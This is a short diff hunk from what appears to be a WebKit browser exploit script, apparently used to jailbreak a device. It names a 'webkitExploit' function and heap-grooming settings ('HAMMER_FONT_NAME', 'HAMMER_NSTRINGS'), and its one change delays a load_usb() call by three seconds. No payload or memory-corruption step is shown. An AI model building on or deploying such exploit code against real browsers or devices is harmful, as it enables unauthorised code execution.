@@ -10,7 +10,7 @@ var HAMMER_FONT_NAME = "font8"; //must take bucket 3 of 8 (counting from zero)
 var HAMMER_NSTRINGS = 700; //tweak this if crashing during hammer time
 
 function webkitExploit(){
-load_usb();  
+setTimeout(load_usb, 3000);  
 StartTimer();
 
     var union = new ArrayBuffer(8);
